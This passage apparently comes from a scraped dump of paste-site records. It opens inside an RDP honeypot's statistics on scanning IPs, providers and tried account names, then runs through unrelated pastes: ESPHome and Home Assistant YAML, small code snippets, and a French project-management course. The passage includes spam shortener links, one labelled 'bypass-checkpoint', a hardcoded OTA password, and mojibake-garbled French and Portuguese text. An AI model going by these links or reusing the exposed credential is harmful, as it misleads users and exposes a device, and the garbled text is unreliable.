    ""Unknown"": 18,
    ""Verizon Business"": 36,
    ""Xhostis"": 10,
    ""Palo Alto Networks, Inc"": 48,
    ""Red Bytes LLC"": 2,
    ""Xhost Internet Solutions"": 8,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Horizon LLC"": 8,
    ""JSC Teleset"": 2,
    ""CenturyLink, Inc"": 2,
    ""OVH Ltd"": 8,
    ""Cloud Solutions S.A"": 2,
    ""Censys, Inc."": 2,
    ""Kornet"": 4,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Servers.com, Inc."": 4,
    ""Akamai Technologies, Inc."": 8,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""AI Spera"": 2,
    ""UAB Host Baltic"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""EE Wavecom"": 2,
    ""Chinanet JS"": 6,
    ""Alviva Holding Limited"": 2,
    ""Asiatech Data Transmission Co."": 2,
    ""The Shadow Server Foundation"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""DigitalOcean, LLC"": 6,
    ""Linode"": 4
  },
  ""regionName"": {
    ""Arizona"": 4,
    ""North Carolina"": 18,
    ""Kaunas"": 60,
    ""Tirana"": 8,
    ""Hainan"": 2,
    ""New Jersey"": 38,
    ""North Holland"": 20,
    ""California"": 56,
    ""St.-Petersburg"": 2,
    ""Hubei"": 2,
    ""Moscow"": 10,
    ""Tatarstan Republic"": 2,
    ""England"": 8,
    ""Distrito Federal"": 2,
    ""Hesse"": 8,
    ""Astana"": 8,
    ""Seoul"": 4,
    ""Texas"": 6,
    ""Washington"": 8,
    ""Vilnius"": 4,
    ""Harjumaa"": 2,
    ""Jiangsu"": 6,
    ""Tehran"": 2,
    ""Zhejiang"": 2,
    ""Georgia"": 2
  },
  ""country"": {
    ""United States"": 132,
    ""Lithuania"": 64,
    ""Albania"": 8,
    ""China"": 12,
    ""The Netherlands"": 20,
    ""Russia"": 14,
    ""United Kingdom"": 8,
    ""Venezuela"": 2,
    ""Germany"": 8,
    ""Kazakhstan"": 8,
    ""South Korea"": 4,
    ""Estonia"": 2,
    ""Iran"": 2
  },
  ""account"": {
    ""hello"": 28,
    ""142.93.8.59"": 114,
    ""(empty)"": 10,
    ""Domain"": 8,
    ""cGdGrplyf"": 2,
    ""PFLKXhbSR"": 2,
    ""gJVihJelI"": 2,
    ""seEZJVYNp"": 2,
    ""dcRZDO"": 2,
    ""zEcWmp"": 2,
    ""masscan"": 6,
    ""Test"": 38,
    ""Administr"": 16,
    ""PUAXZgmdG"": 2,
    ""PuVgNBeXf"": 2,
    ""vkLHCNCYo"": 2,
    ""mGxNTzuqp"": 2,
    ""dmAEkx"": 2,
    ""gKCgYC"": 2,
    ""nmap"": 2,
    ""Administrator"": 2,
    ""hIYSPmScP"": 2,
    ""ZZoSbQGEV"": 2,
    ""kJfWCRDYr"": 2,
    ""JNfROUgNG"": 2,
    ""sJRPWr"": 2,
    ""PlSMCW"": 2,
    ""rqio06ff"": 2,
    ""Unknown"": 6,
    ""chjno5zf"": 2,
    ""beio"": 2,
    ""lxZVQOxNt"": 2,
    ""VZCgSlrBx"": 2,
    ""byCdJjvJs"": 2,
    ""hQHzmAdRR"": 2,
    ""BJdepg"": 2,
    ""ImcFpR"": 2
  },
  ""keyboard"": {
    ""Unknown"": 234,
    ""English - United States"": 18,
    ""English - United Kingdom"": 32
  },
  ""client_build"": {
    ""Unknown"": 234,
    ""RDP 5.1"": 44,
    ""RDP 5.2"": 6
  },
  ""client_name"": {
    ""Unknown"": 234,
    ""MSTSC"": 8,
    ""EMP-LAP-0014"": 32,
    ""rdpscan"": 4,
    ""prod-beryllium-s"": 6
  },
  ""ip_type"": {
    ""hosting"": 102,
    ""Unknown"": 174,
    ""mobile"": 2,
    ""hosting & proxy"": 6
  }
}"
RvZLQa0K,2024-01-04_stats.json,rdp_snitch,JSON,Thursday 4th of January 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""148.163.53.163"": 2,
    ""208.234.0.26"": 9,
    ""194.165.17.21"": 26,
    ""109.69.7.157"": 4,
    ""124.225.77.47"": 1,
    ""74.105.22.130"": 18,
    ""185.170.144.113"": 1,
    ""198.235.24.123"": 6,
    ""31.41.244.83"": 1,
    ""194.165.16.73"": 2,
    ""87.251.75.145"": 3,
    ""103.184.47.83"": 1,
    ""62.204.41.208"": 3,
    ""81.23.154.115"": 1,
    ""67.133.192.80"": 1,
    ""185.170.144.3"": 4,
    ""51.75.160.42"": 4,
    ""179.60.147.118"": 1,
    ""167.94.146.52"": 1,
    ""205.210.31.72"": 6,
    ""45.86.81.112"": 4,
    ""61.78.123.204"": 2,
    ""62.122.184.188"": 1,
    ""173.237.25.68"": 2,
    ""172.232.163.128"": 4,
    ""88.214.25.57"": 1,
    ""94.102.61.23"": 1,
    ""45.227.254.55"": 2,
    ""165.154.138.85"": 1,
    ""80.79.117.42"": 1,
    ""58.218.204.183"": 3,
    ""81.19.135.47"": 1,
    ""80.66.76.149"": 1,
    ""198.235.24.66"": 6,
    ""46.245.64.10"": 1,
    ""184.105.139.67"": 1,
    ""36.139.61.15"": 1,
    ""138.68.232.164"": 3,
    ""45.79.13.183"": 1,
    ""50.116.32.103"": 1,
    ""194.165.16.76"": 2,
    ""198.235.24.84"": 6,
    ""62.204.41.199"": 1
  },
  ""asn"": {
    ""AS53755"": 2,
    ""AS10843"": 9,
    ""AS48721"": 30,
    ""AS21183"": 4,
    ""AS4134"": 4,
    ""AS701"": 18,
    ""AS197414"": 5,
    ""AS396982"": 24,
    ""AS57678"": 1,
    ""AS208091"": 4,
    ""AS146817"": 1,
    ""AS59425"": 4,
    ""AS12389"": 1,
    ""AS209"": 1,
    ""AS16276"": 4,
    ""AS209588"": 2,
    ""AS398705"": 1,
    ""AS205516"": 4,
    ""AS4766"": 2,
    ""AS57523"": 1,
    ""AS7979"": 2,
    ""AS63949"": 6,
    ""AS29551"": 1,
    ""AS202425"": 1,
    ""AS267784"": 2,
    ""AS135377"": 1,
    ""AS34702"": 1,
    ""AS43754"": 1,
    ""AS6939"": 1,
    ""AS56041"": 1,
    ""AS14061"": 3
  },
  ""isp"": {
    ""Input Output Flood LLC"": 2,
    ""Advanced Internet Technologies"": 9,
    ""Flyservers S.A."": 34,
    ""Vodafone Network"": 4,
    ""Hainan Network of ChinaTelecom"": 1,
    ""Verizon Business"": 18,
    ""Xhost Internet Solutions LP"": 9,
    ""Google LLC"": 24,
    ""Cat Technologies Co. Limited"": 1,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Horizon LLC"": 4,
    ""Rostelecom networks"": 1,
    ""CenturyLink"": 1,
    ""OVH SAS"": 4,
    ""Censys, Inc."": 1,
    ""NLS ASTANA LLP"": 4,
    ""Korea Telecom"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Servers.com, Inc."": 2,
    ""Akamai Technologies, Inc."": 6,
    ""NOC EMAIL: noc@one-host.net"": 1,
    ""IP Volume inc"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Aktsiaselts WaveCom"": 1,
    ""Chinanet"": 3,
    ""Asiatech Data Transmission company"": 1,
    ""Hurricane Electric LLC"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""DigitalOcean, LLC"": 3
  },
  ""org"": {
    ""rdpdaddy.com"": 2,
    ""Verizon Communications"": 9,
    ""Flyservers S.A"": 30,
    ""Unknown"": 9,
    ""Verizon Business"": 18,
    ""Xhostis"": 5,
    ""Palo Alto Networks, Inc"": 24,
    ""Red Bytes LLC"": 1,
    ""Xhost Internet Solutions"": 4,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Horizon LLC"": 4,
    ""JSC Teleset"": 1,
    ""CenturyLink, Inc"": 1,
    ""OVH Ltd"": 4,
    ""Cloud Solutions S.A"": 1,
    ""Censys, Inc."": 1,
    ""Kornet"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Servers.com, Inc."": 2,
    ""Akamai Technologies, Inc."": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 1,
    ""AI Spera"": 1,
    ""UAB Host Baltic"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""EE Wavecom"": 1,
    ""Chinanet JS"": 3,
    ""Alviva Holding Limited"": 1,
    ""Asiatech Data Transmission Co."": 1,
    ""The Shadow Server Foundation"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""DigitalOcean, LLC"": 3,
    ""Linode"": 2
  },
  ""regionName"": {
    ""Arizona"": 2,
    ""North Carolina"": 9,
    ""Kaunas"": 30,
    ""Tirana"": 4,
    ""Hainan"": 1,
    ""New Jersey"": 19,
    ""North Holland"": 10,
    ""California"": 28,
    ""St.-Petersburg"": 1,
    ""Hubei"": 1,
    ""Moscow"": 5,
    ""Tatarstan Republic"": 1,
    ""England"": 4,
    ""Distrito Federal"": 1,
    ""Hesse"": 4,
    ""Astana"": 4,
    ""Seoul"": 2,
    ""Texas"": 3,
    ""Washington"": 4,
    ""Vilnius"": 2,
    ""Harjumaa"": 1,
    ""Jiangsu"": 3,
    ""Tehran"": 1,
    ""Zhejiang"": 1,
    ""Georgia"": 1
  },
  ""country"": {
    ""United States"": 66,
    ""Lithuania"": 32,
    ""Albania"": 4,
    ""China"": 6,
    ""The Netherlands"": 10,
    ""Russia"": 7,
    ""United Kingdom"": 4,
    ""Venezuela"": 1,
    ""Germany"": 4,
    ""Kazakhstan"": 4,
    ""South Korea"": 2,
    ""Estonia"": 1,
    ""Iran"": 1
  },
  ""account"": {
    ""hello"": 14,
    ""142.93.8.59"": 57,
    ""(empty)"": 5,
    ""Domain"": 4,
    ""cGdGrplyf"": 1,
    ""PFLKXhbSR"": 1,
    ""gJVihJelI"": 1,
    ""seEZJVYNp"": 1,
    ""dcRZDO"": 1,
    ""zEcWmp"": 1,
    ""masscan"": 3,
    ""Test"": 19,
    ""Administr"": 8,
    ""PUAXZgmdG"": 1,
    ""PuVgNBeXf"": 1,
    ""vkLHCNCYo"": 1,
    ""mGxNTzuqp"": 1,
    ""dmAEkx"": 1,
    ""gKCgYC"": 1,
    ""nmap"": 1,
    ""Administrator"": 1,
    ""hIYSPmScP"": 1,
    ""ZZoSbQGEV"": 1,
    ""kJfWCRDYr"": 1,
    ""JNfROUgNG"": 1,
    ""sJRPWr"": 1,
    ""PlSMCW"": 1,
    ""rqio06ff"": 1,
    ""Unknown"": 3,
    ""chjno5zf"": 1,
    ""beio"": 1,
    ""lxZVQOxNt"": 1,
    ""VZCgSlrBx"": 1,
    ""byCdJjvJs"": 1,
    ""hQHzmAdRR"": 1,
    ""BJdepg"": 1,
    ""ImcFpR"": 1
  },
  ""keyboard"": {
    ""Unknown"": 117,
    ""English - United States"": 9,
    ""English - United Kingdom"": 16
  },
  ""client_build"": {
    ""Unknown"": 117,
    ""RDP 5.1"": 22,
    ""RDP 5.2"": 3
  },
  ""client_name"": {
    ""Unknown"": 117,
    ""MSTSC"": 4,
    ""EMP-LAP-0014"": 16,
    ""rdpscan"": 2,
    ""prod-beryllium-s"": 3
  },
  ""ip_type"": {
    ""hosting"": 51,
    ""Unknown"": 87,
    ""mobile"": 1,
    ""hosting & proxy"": 3
  }
}"
AJj7gxnV,2lv2,Artani,Lua,Thursday 4th of January 2024 05:42:36 PM CDT,https://link-target.net/576009/tamper-monkey-download-c2
yLx5tRfR,Untitled,sissou123,SQL,Thursday 4th of January 2024 05:35:09 PM CDT,"SQL for Beginners: Learn SQL using MySQL and Database Design
Understand SQL using the MySQL database. Learn Database Design and Data Analysis with Normalization and Relationships 
for more:https://cuty.io/eMsREJKTDFL1
"
mnZfNDwf,1lv1,Artani,Lua,Thursday 4th of January 2024 05:28:40 PM CDT,https://link-center.net/576009/bypass-checkpoint-2
5PE7S3yt,2lv,Artani,Lua,Thursday 4th of January 2024 05:27:19 PM CDT,https://chromewebstore.google.com/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo
pmDqRt96,esphome oil furnice fuel pump,Azuria,YAML,Thursday 4th of January 2024 04:52:40 PM CDT,"esphome:
  name: sonoff-basic-05
  platform: ESP8266
  board: sonoff_basic
  on_loop:
    then:
      - if:
          condition:
            not:
              script.is_running: cycle_pump
          then:
            - script.execute: cycle_pump

# Enable logging
logger:

globals:
  - id: pump_enabled
    type: bool
    restore_value: no
    initial_value: 'false'

  - id: pump_interval
    type: int
    restore_value: yes
    initial_value: '12'  

  - id: pump_on_time
    type: int
    restore_value: yes
    initial_value: '6'  

# Enable Home Assistant API
api:

web_server:
  port: 80 
  
ota:
  password: ""c0f858446b950758eb0d433b50ae73e4""

wifi:
  ssid: !secret iot_ssid
  password: !secret iot_pass

  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""Sonoff-Basic-05 Fallback Hotspot""
    password: !secret iot_pass

captive_portal:

binary_sensor:
  - platform: gpio
    pin:
      number: GPIO0
      mode:
        input: true
        pullup: true
      inverted: true
    name: ""Sonoff Basic Button""
    on_press:
      - switch.toggle: pump_relay

  - platform: homeassistant
    name: ""Hydro Pump Enable""
    internal: false
    entity_id: input_boolean.hydro_pump_enable
    on_state:
      then:
        - lambda: |-
            id(pump_enabled) = x;

switch:
  - platform: gpio
    name: ""Pump Relay""
    id: pump_relay
    pin: GPIO12

  - platform: restart
    name: Restart

  - platform: template
    name: ""Template Switch""
    optimistic: true
    id: template_swi
    #lambda: 'return id(pump_enabled);'



status_led:
  pin:
    number: GPIO13
    inverted: yes

number:
  - platform: template
    name: ""hydro_pump_interval_set""
    optimistic: true
    initial_value: 9
    min_value: 0
    max_value: 60
    step: 1
    on_value:
      then:
        - globals.set:
            id: pump_interval
            value: !lambda 'return x;'


  - platform: template
    name: ""hydro_pump_on_time_set""
    optimistic: true
    min_value: 0
    max_value: 25
    step: 0.25
    on_value:
      then:
        - globals.set:
            id: pump_on_time
            value: !lambda 'return x;'

sensor:
  - platform: homeassistant
    name: Hydro Pump Interval
    entity_id: input_number.hydro_pump_interval
    internal: false
    on_value:
      then:
        - lambda: |-
            id(pump_interval) = x;

  - platform: homeassistant
    name: Hydro Pump On Time
    internal: false
    entity_id: input_number.hydro_pump_on_time
    on_value:
      then:
        - lambda: |-
            id(pump_on_time) = x;



script:
  - id: cycle_pump
    then:
      - if:
          condition:
            #lambda: |-
            #   return id(pump_enabled) = true;
            switch.is_on: template_swi

          then:
              - logger.log: ""Started First (Interval-run time) Delay""
              - delay: !lambda |-
                  return (id(pump_interval) - id(pump_on_time)) * 1000;
              - switch.turn_on: pump_relay
              - logger.log: ""Started second (run time) Delay""
              - delay: !lambda |-
                  return id(pump_on_time) * 1000;
              - switch.turn_off: pump_relay"
LJKTvYuj,Untitled,mark-naylor-1701,Python,Thursday 4th of January 2024 03:56:37 PM CDT,"def juxt(*args):
    functions = args
    def f(*args):
        return [f(args) for f in functions]
    return f"
iGeQ2hJB,Untitled,soyl,Java,Thursday 4th of January 2024 03:50:35 PM CDT,"public void deleteDirector(Integer id) {
        String deleteQuery = ""DELETE FROM directors WHERE directors_id = ?;"";
        String updateQuery = ""UPDATE directors SET directors_id = directors_id - 1 WHERE directors_id > ?;"";

        // –£–¥–∞–ª–µ–Ω–∏–µ —Ä–µ–∂–∏—Å—Å–µ—Ä–∞
        jdbcTemplate.update(deleteQuery, id);

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ—Å–ª–µ–¥—É—é—â–∏—Ö –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–≤ —Ä–µ–∂–∏—Å—Å–µ—Ä–æ–≤
        jdbcTemplate.update(updateQuery, id);

    }"
QfJnK7BA,Hit To Destroy Part,Joriangames,Lua,Thursday 4th of January 2024 03:30:53 PM CDT,"--[[
HOW TO MAKE HIT-TO-DESTROY Part!!! Roblox Studio Tutorial youtube.com/c/BloxianCode
Tutorial: https://youtu.be/OjFsEDZEK5A?si=r4eGEbWWw_pHhmL4

Don't touch the model or script unless you know what you are doing
Watch the video for more info https://youtu.be/OjFsEDZEK5A?si=r4eGEbWWw_pHhmL4
]]

local gr = Color3.fromRGB(56,255,12)
local red = Color3.fromRGB(255,0,4)
local canTouch = true
local partH = 100

script.Parent.Touched:Connect(function(hit)
	if hit.Parent.Name == ""ClassicSword"" and canTouch == true then
		canTouch = false
		partH = partH -10
		
		script.Parent.BillboardGui.TextLabel.Text = ""Health: ""..partH..""%""
		script.Parent.BillboardGui.TextLabel.BackgroundColor3 = red:lerp(gr, partH / 100)
		
		if partH == 0 then
			script.Parent.BillboardGui.TextLabel.Text = ""Destroying...""
			wait(2)
			script.Parent:Destroy()
		end
		
		wait(1)
		canTouch = true
	end
end)
"
WuZAxWRX,OOP Object-oriented programming - Example,Rnery,Python,Thursday 4th of January 2024 03:02:14 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Class = Esp√©cie de Animal
class Passaro:
    # A√ß√µes principais que todo p√°ssaro faz

    def voar(self): 
        print(""Voando!"")

# Subclass = Animais que s√£o p√°ssaros
class Pardal(Passaro):
    def voar(self):
        return super().voar()

class Avestruz(Passaro):
    def voar(self):
        return super().voar()

animal_selecionado = Pardal()
animal_selecionado.voar()

""""""
Daqui pra baixo seria o avan√ßo da parte de cima..

S√≥ pra avan√ßados, pare aqui se voc√™ ainda n√£o entendeu a parte de cima.
""""""

# Interface Segregation Principle
class Voador:
    def voar(self):
        pass

# Classe Abstrata - Princ√≠pio da Responsabilidade √önica
class Passaro(Voador):
    def voar(self):
        print(""Voando!"")

# Princ√≠pio da Substitui√ß√£o de Liskov
class Pardal(Passaro):
    pass

class Avestruz(Passaro):
    def voar(self):
        print(""Avestruz n√£o pode voar!"")

def main():
    # Princ√≠pio da Invers√£o de Depend√™ncia
    animal_selecionado = Pardal()
    animal_selecionado.voar()

if __name__ == ""__main__"":
    main()
"
KgveZm6S,HA - YAML - Custom:button-card example witH blinking background,dykandDK,YAML,Thursday 4th of January 2024 02:57:53 PM CDT,"type: custom:button-card
entity: binary_sensor.door_contact
name: Door
state_color: false
state:
  - operator: '=='
    value: 'off'
    icon: mdi:door-closed
  - operator: '=='
    value: 'on'
    icon: mdi:door-open
    color: white
    styles:
      card:
        - animation: blink 2s ease infinite
        - background-color: darkred
      name:
        - color: white"
WBBLFc1y,Cours 02,Rakotojr,HTML,Thursday 4th of January 2024 02:36:30 PM CDT,"Dans cette premi√®re partie du cours sur les acteurs et les ressources d'un projet, nous allons explorer les ressources n√©cessaires pour mener √† bien un projet, les processus de gestion des ressources, l'importance de l'estimation des ressources et la gestion des ressources rares.

1. Ressources du projet :
   - Les ressources d'un projet sont divis√©es en deux grandes cat√©gories : les ressources humaines et les ressources mat√©rielles.
   - Les ressources humaines comprennent le chef de projet et les membres de l'√©quipe, tandis que les ressources mat√©rielles englobent les √©quipements, les installations, le mat√©riel et les consommables.
   - Les ressources peuvent provenir de l'entreprise ou √™tre obtenues √† l'ext√©rieur en fonction des besoins du projet.

2. Processus de gestion des ressources :
   - La gestion des ressources d'un projet implique plusieurs √©tapes :
     - Estimer les besoins en ressources en identifiant les types et les quantit√©s n√©cessaires.
     - Obtenir les ressources pour former l'√©quipe de projet.
     - Assurer le d√©veloppement des ressources humaines et maintenir l'alignement entre les ressources et les besoins tout au long du projet.

3. Importance de l'estimation des ressources :
   - Une estimation incorrecte des ressources peut entra√Æner des retards ou des co√ªts suppl√©mentaires pour le projet.
   - Il est essentiel que les estimations soient pr√©cises pour √©viter des cons√©quences n√©gatives sur le budget et les d√©lais du projet.

4. Cas des ressources rares :
   - Les ressources rares sont celles difficiles √† obtenir en raison de leur co√ªt, de leur d√©lai de production ou de leur raret√© sur le march√©.
   - Le chef de projet doit g√©rer ces ressources avec attention et proactivit√©, car elles peuvent avoir un impact significatif sur le projet.
   - Les ressources rares peuvent √™tre des ressources humaines, telles que des experts en Intelligence Artificielle (AI), ou des ressources mat√©rielles, comme des √©quipements co√ªteux.

5. M√©thodes d'estimation :
   - Les m√©thodes d'estimation des ressources sont les m√™mes, que les ressources soient rares ou courantes.
   - L'estimation des ressources est une √©tape cruciale pour planifier efficacement le projet et garantir la disponibilit√© des ressources n√©cessaires.

En conclusion, la gestion efficace des ressources humaines et mat√©rielles est essentielle pour le succ√®s d'un projet. L'estimation correcte des ressources et la gestion proactive des ressources rares sont des √©l√©ments cl√©s de la planification et de l'ex√©cution r√©ussies d'un projet.

Dans cette deuxi√®me partie du cours sur les acteurs et les ressources d'un projet, nous allons explorer l'estimation des besoins en ressources, les m√©thodes d'estimation, et l'importance de repr√©senter ces ressources sous forme d'organigramme.

1. Estimer les besoins en ressources :
   - L'estimation des besoins en ressources consiste √† d√©terminer le type, le niveau de qualification, la performance, et la quantit√© de ressources n√©cessaires pour le projet.
   - Les estimations √©voluent au fil de l'avancement du projet et peuvent varier en fonction des m√©thodes d'estimation utilis√©es.

2. M√©thodes d'estimation :
   - Les deux m√©thodes d'estimation couramment utilis√©es sont :
     - L'estimation √† dire d'expert, bas√©e sur le jugement d'experts, notamment lorsque le chef de projet est exp√©riment√© et a travaill√© sur des projets similaires.
     - L'estimation par analogie, qui repose sur des informations de projets ant√©rieurs similaires pour estimer les ressources n√©cessaires.

3. Contraintes li√©es aux estimations de quantit√© de ressources :
   - Estimer la quantit√© de ressources peut √™tre complexe en raison de contraintes telles que les l√©gislations sur les dur√©es de travail et les r√©unions d'entreprise qui ne sont pas li√©es directement au projet.
   - Il est essentiel de tenir compte de ces contraintes pour obtenir des estimations pr√©cises.

4. Choix de la m√©thode :
   - Le choix de la m√©thode d'estimation d√©pend du moment o√π l'estimation est effectu√©e, de l'exp√©rience du chef de projet, de la disponibilit√© de donn√©es fiables sur des projets ant√©rieurs, et des r√®gles de l'entreprise en mati√®re d'outils et de m√©thodes.

5. Organigramme des ressources :
   - L'organigramme des ressources est une repr√©sentation hi√©rarchique des types et des quantit√©s de ressources n√©cessaires au projet, regroup√©es par famille (par exemple, ressources humaines et ressources mat√©rielles).
   - Cet organigramme aide le chef de projet √† montrer les besoins du projet et √† identifier les ressources qui peuvent ne pas √™tre disponibles au sein de l'entreprise.

En conclusion, l'estimation des besoins en ressources est une √©tape cruciale de la planification du projet. Le chef de projet doit choisir la m√©thode d'estimation appropri√©e, tenir compte des contraintes li√©es aux quantit√©s de ressources, et repr√©senter ces ressources de mani√®re organis√©e √† l'aide d'un organigramme pour assurer le succ√®s du projet.

Dans cette troisi√®me partie du cours sur les acteurs et les ressources du projet, nous aborderons l'obtention des ressources n√©cessaires √† la r√©alisation du projet.

1. Comment obtenir les ressources :
   - L'obtention des ressources implique un √©quilibre entre les besoins du projet, la disponibilit√© des ressources, leurs sp√©cificit√©s et leurs co√ªts.
   - Les facteurs humains jouent un r√¥le essentiel, car le chef de projet a tendance √† favoriser les ressources avec lesquelles il a d√©j√† travaill√©.

2. N√©gociation avec les managers fonctionnels :
   - Dans de nombreuses grandes entreprises, les ressources proviennent de diff√©rentes unit√©s organisationnelles.
   - Le chef de projet devra n√©gocier avec les managers fonctionnels pour obtenir les ressources n√©cessaires.
   - Le succ√®s de cette n√©gociation d√©pend de l'habilet√© du chef de projet, de l'importance du projet pour l'entreprise, et de la coop√©ration du manager fonctionnel.

3. Calendrier des ressources :
   - Chaque entreprise maintient un calendrier des ressources, qui r√©pertorie les p√©riodes de travail, d'indisponibilit√© (pour formation, vacances, etc.), les week-ends et les jours f√©ri√©s.
   - Ce calendrier prend en compte les informations sur les ressources, telles que leur type, leurs comp√©tences, leur niveau de performance, leur disponibilit√©, et leur co√ªt.

4. Processus d'obtention des ressources :
   - Le chef de projet travaille g√©n√©ralement en deux phases :
     - Dans la premi√®re phase, il s√©lectionne initialement plus de ressources que n√©cessaire en se basant principalement sur leur disponibilit√©.
     - Dans la seconde phase, il affine sa s√©lection en prenant en compte les sp√©cificit√©s, le niveau de performance, et le co√ªt de chaque ressource.
   - Une fois la liste des ressources potentielles √©tablie, le chef de projet doit n√©gocier avec les ressources ou leurs managers pour les int√©grer dans le projet.
   - Apr√®s l'approbation, les ressources humaines et mat√©rielles sont affect√©es au projet, et le calendrier des ressources est mis √† jour en cons√©quence.

5. Conditions pour une bonne affectation des ressources :
   - Une affectation r√©ussie des ressources d√©pend du niveau de d√©tail du calendrier du projet et du contenu du projet.
   - L'affectation des ressources, le calendrier et le contenu du projet sont √©troitement li√©s, et tout changement dans l'un de ces aspects peut affecter les autres.
   - Il est important de noter qu'un changement de ressource peut √©galement entra√Æner des modifications dans le budget du projet.

En r√©sum√©, l'obtention des ressources est un processus essentiel dans la gestion de projet. Elle n√©cessite une n√©gociation habile avec les managers fonctionnels, l'utilisation du calendrier des ressources de l'entreprise, et une bonne compr√©hension des besoins du projet. Une fois les ressources obtenues, elles sont int√©gr√©es au projet et le calendrier est ajust√© en cons√©quence pour assurer une ex√©cution r√©ussie.


Dans cette quatri√®me partie du cours sur les acteurs et les ressources du projet, nous examinerons la constitution de l'√©quipe de projet et l'organisation qui en d√©coule.

1. Organisation de l'√©quipe de projet :
   - Le chef de projet d√©termine l'organisation de son √©quipe en fonction de la taille du projet.
   - Pour les petits projets (moins de 10 personnes), les membres de l'√©quipe reportent directement au chef de projet.
   - Pour les projets plus importants, le chef de projet met en place des coordinateurs de projet qui supervisent leurs propres √©quipes.
   - Des sp√©cialistes tels que le responsable de communication et l'architecte de solution peuvent √©galement √™tre directement reli√©s au chef de projet.
   - Pour repr√©senter graphiquement cette organisation, le chef de projet cr√©e un organigramme de l'√©quipe de projet.

2. R√¥les et responsabilit√©s :
   - Le chef de projet d√©finit les r√¥les et responsabilit√©s des membres de son √©quipe en fonction des lots de travaux.
   - Il se pose les questions suivantes pour chaque lot de travail : Qui est le R√©alisateur, l'Approbateur, le Consult√©, et l'Inform√© ?
   - Ces r√©flexions aboutissent √† la cr√©ation d'une matrice RACI, bas√©e sur les acronymes R√©alisateur, Approbateur, Consult√©, Inform√©.
   - Il est important de noter qu'un lot de travail ne peut avoir qu'un seul Approbateur, m√™me s'il peut √™tre r√©alis√© par plusieurs personnes.
   - Dans les gros projets, chaque coordinateur de projet √©tablit sa propre matrice RACI pour les ressources qui lui sont directement attach√©es.

3. R√©union de lancement du projet :
   - Le chef de projet organise une r√©union de lancement du projet, √©galement appel√©e Kick-Off meeting.
   - Dans cette r√©union, le chef de projet pr√©sente la raison d'√™tre du projet, les grandes lignes du projet, l'organisation du projet, ainsi que les r√¥les et responsabilit√©s de chaque membre de l'√©quipe.
   - Cette r√©union est cruciale pour permettre √† tous les membres de comprendre leur place dans le projet, √©tablir des bases de travail coop√©ratif, et faciliter la communication au sein de l'√©quipe.
   - Elle rev√™t une importance particuli√®re dans les projets o√π les membres de l'√©quipe travaillent √† distance et communiquent principalement de mani√®re virtuelle.
   - La r√©union de lancement peut avoir lieu en d√©but ou en fin de planification, en fonction de la taille du projet.

En r√©sum√©, la constitution de l'√©quipe de projet est une √©tape essentielle dans la gestion de projet. Elle implique une organisation adapt√©e en fonction de la taille du projet, la d√©finition des r√¥les et responsabilit√©s, ainsi qu'une r√©union de lancement du projet pour assurer une compr√©hension claire de la mission de chaque membre de l'√©quipe. Cela contribue √† une meilleure collaboration et √† la r√©ussite du projet.

Dans cette cinqui√®me partie du cours sur la constitution de l'√©quipe de projet, nous continuerons d'examiner l'organisation de l'√©quipe et la d√©finition des r√¥les et responsabilit√©s.

1. Organisation de l'√©quipe de projet :
   - Le chef de projet d√©termine l'organisation de son √©quipe en fonction de la taille du projet.
   - Pour les petits projets (moins de 10 personnes), les membres de l'√©quipe reportent directement au chef de projet.
   - Pour les projets plus importants, le chef de projet met en place des coordinateurs de projet qui supervisent leurs propres √©quipes.
   - Des sp√©cialistes tels que le responsable de communication et l'architecte de solution peuvent √©galement √™tre directement reli√©s au chef de projet.
   - Le chef de projet repr√©sente graphiquement cette organisation √† travers un organigramme de l'√©quipe de projet.

2. R√¥les et responsabilit√©s (suite) :
   - Le chef de projet d√©termine les r√¥les et responsabilit√©s des membres de l'√©quipe pour chaque lot de travaux.
   - Il se pose les questions : Qui est R√©alisateur, Approbateur, Consult√©, Inform√© pour chaque lot ?
   - Ces r√©flexions aboutissent √† la cr√©ation d'une matrice RACI bas√©e sur les acronymes R√©alisateur, Approbateur, Consult√©, Inform√©.
   - Il est important de noter qu'un lot de travail ne peut avoir qu'un seul Approbateur, m√™me s'il peut √™tre r√©alis√© par plusieurs personnes.
   - Chaque coordinateur de projet dans les gros projets √©tablit sa propre matrice RACI pour les ressources sous sa supervision.

3. R√©union de lancement du projet (suite) :
   - La r√©union de lancement du projet, √©galement appel√©e Kick-Off meeting, est organis√©e par le chef de projet.
   - Dans cette r√©union, le chef de projet pr√©sente la raison d'√™tre du projet, les grandes lignes du projet, l'organisation du projet, ainsi que les r√¥les et responsabilit√©s de chaque membre de l'√©quipe.
   - Cette r√©union favorise la compr√©hension des missions de chaque membre et encourage une collaboration efficace.
   - Elle rev√™t une importance particuli√®re lorsque les membres de l'√©quipe travaillent √† distance et communiquent principalement de mani√®re virtuelle.
   - Le moment de la r√©union varie en fonction de la taille du projet, se d√©roulant en d√©but de planification pour les petits projets et en fin de planification pour les gros projets.

En r√©sum√©, la constitution de l'√©quipe de projet est une √©tape cruciale de la gestion de projet. Elle d√©pend de la taille du projet et implique une organisation adapt√©e, la d√©finition claire des r√¥les et responsabilit√©s de chaque membre, et une r√©union de lancement du projet pour faciliter la compr√©hension et la coop√©ration au sein de l'√©quipe. Cela contribue au succ√®s du projet.

Dans cette sixi√®me partie concernant la prise en compte de la charge de travail, nous allons aborder ce concept ainsi que les facteurs qui influencent la perception de la charge de travail au sein de l'√©quipe de projet.

1. Qu'est-ce que la charge de travail ?
